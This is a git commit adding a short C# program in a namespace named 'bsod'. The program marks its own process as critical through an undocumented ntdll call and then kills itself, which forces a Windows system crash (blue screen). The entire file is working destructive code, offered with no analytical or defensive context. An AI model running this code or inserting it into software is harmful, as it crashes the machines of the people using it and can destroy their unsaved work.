90e797b96a68e03d35fb6f7c1c83fa44f5c8395c
Enderbyte09 <83879635+Enderbyte09@users.noreply.github.com>
2023-03-30 20:40:01 -0700

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,18 @@
+﻿using System;
+using System.Runtime.InteropServices;
+
+namespace bsod
+{
+    internal class Program
+    {
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
+        static void Main(string[] args)
+        {
+            
+            System.Diagnostics.Process.EnterDebugMode();
+            RtlSetProcessIsCritical(1, 0, 0);
+            System.Diagnostics.Process.GetCurrentProcess().Kill();
+        }
+    }
+}
